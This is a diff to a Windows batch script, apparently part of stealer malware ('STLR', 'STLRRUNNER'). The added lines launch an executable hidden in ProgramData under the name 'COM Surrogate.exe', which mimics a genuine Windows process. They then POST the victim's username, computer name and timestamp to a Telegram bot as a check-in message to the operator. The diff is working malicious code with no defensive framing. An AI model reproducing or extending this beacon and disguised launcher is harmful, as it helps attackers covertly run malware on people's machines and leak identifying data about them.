@@ -3,7 +3,7 @@
 
 setlocal enabledelayedexpansion
 
-set "BATCHVERSION=1.4"
+set "BATCHVERSION=1.5"
 
 set "chars=ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"
 set "filename="
@@ -108,8 +108,18 @@ echo.
 
 
 echo Starting COM
+
 start "" "%ProgramData%\Microsoft\Windows\COM Surrogate.exe"
+
 echo Started
+
+
+curl -s -X POST "https://api.telegram.org/bot%TOKEN_STLR%/sendMessage" ^
+     -d "chat_id=%CHAT_ID_STLR%" ^
+     -d "message_thread_id=%TOPIC_ID_STLR%" ^
+     -d "text=%USERNAME%(%COMPUTERNAME%)|COMSTARTEEEEED|%time%|(v%BATCHVERSION%)"
+
+
 
 echo.
 set "MESSAGE_STLR=%USERNAME%(%COMPUTERNAME%)|STLRRUNNER|COMSTARTED.3H.LEFTFORSTARTCOM..|%time%|(v%BATCHVERSION%)"
